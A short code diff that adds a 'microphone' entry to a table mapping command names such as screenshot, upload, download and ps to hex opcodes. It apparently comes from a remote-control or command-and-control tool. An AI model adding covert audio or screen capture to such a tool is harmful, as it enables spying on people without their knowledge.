@@ -23,6 +23,7 @@ commands = {
     "cp": 0x45, 
     "cat": 0x46, 
     "screenshot": 0x47,
+    "microphone": 0x48,
     "upload": 0x50, 
     "download": 0x51,
     "ps": 0x52, 
